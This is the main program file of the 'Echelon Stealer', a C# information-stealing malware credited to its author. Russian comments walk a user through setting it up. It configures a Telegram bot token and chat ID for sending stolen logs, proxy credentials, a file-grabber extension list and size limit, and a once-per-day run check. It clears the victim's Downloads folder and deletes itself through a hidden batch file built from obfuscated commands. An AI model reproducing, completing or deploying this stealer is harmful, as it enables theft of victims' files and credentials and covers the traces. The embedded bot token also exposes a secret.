﻿///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using Echelon.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace Echelon
{
    class Program
    {
        #region Settings Stealer
        // Уникальный идентификатор билда, опционально.
        public static string buildversion = "V5 MyBuild"; 

        //Токен бота в телеге, создать бота и получить токен тут: @BotFather
        public static string Token = "1283332434:AAFwg3x7sG10_Z75Ntawy55ceVzC8gggAyL4";

        // Telegram ID чата, узнать свой ID чата можно тут: @my_id_bot
        public static string ID = "824301566";

        // Настроки Proxy, поддерживает только proxy http/s с поддержкой POST запросов, socks's не поддерживает!
        public static string ip ="1.1.1.1"; // IP Proxy
        public static int port = 4239; // Порт Proxy
        public static string login = "USER"; // Логин Proxy
        public static string password = "PASS0RD"; // Пароль Proxy

        // Пароль для архива с логом:
        public static string passwordzip = "PASS0RD"; // На архив

        // максимальный вес файла в файлграббере 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static int sizefile = 10500000;

        // Список расширений для сбора файлов
        public static string[] expansion = new string[]
        {
          ".txt", ".rdp", ".suo", ".config", ".cs", ".csproj", ".tlp", ".sln",
        };
        #endregion
        #region Stealer
        [STAThread]
        private static void Main()
        {
            try
            {
                // Подключаем нужные библиотеки
                AppDomain.CurrentDomain.AssemblyResolve += AppDomain_AssemblyResolve;
                Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args)
                {
                    if (args.Name.Contains("DotNetZip"))
                        return Assembly.Load(Resources.DotNetZip);

                    return null;
                }
                

                // Проверка файла Help.HWID
                if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
                {
                    // Файла Help.HWID нет, запускаем стиллер
                    Collection.GetCollection();
                }

                else
                {
                    // Файл Help.HWID есть, проверяем записанную в нем дату
                    if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID + Help.dateLog))
                    {
                        // Дата в файле Help.HWID отличается от сегодняшней, запускаем стиллер
                        Collection.GetCollection();
                    }
                    else
                    {
                        // В файле Help.HWID сегодняшняя дата, закрываемся, означает что сегодня уже был лог с данного пк и не нужно слать повторы.
                        Environment.Exit(0);
                    }
                }
            }
            catch
            {
                Clean.GetClean();
                return;
            }

            finally
            {
                // Чистим следы за собой, небольшой метод вторичной проверки. Так же метод очищает папку Downloads у юзера
                Clean.GetClean();

                // Самоудаление после отправки лога
                string batch = Path.GetTempFileName() + Decrypt.Get("H4sIAAAAAAAEANNLzk0BAMPCtLEEAAAA");
                using (StreamWriter sw = new StreamWriter(batch))
                {
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAFNySE3OyFfIT0sDAP8G798KAAAA")); // скрываем консоль
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEACvJzE3NLy1RMFGwU/AL9QEAGpgiIA8AAAA=")); // Задержка до выполнения следуюющих команд в секундах.
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\"" + " /f /q"); // Удаляем исходный билд
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHN2UQAAQkDmIgMAAAA=") + Path.GetTempPath()); // Переходим во временную папку юзера
                    sw.WriteLine(Decrypt.Get("H4sIAAAAAAAEAHNx9VEAAJx/wSQEAAAA") + "\"" + batch + "\"" + " /f /q"); // Удаляем .cmd

                }

                Process.Start(new ProcessStartInfo()
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                Environment.Exit(0);
            }



        }
        #endregion
    }
}
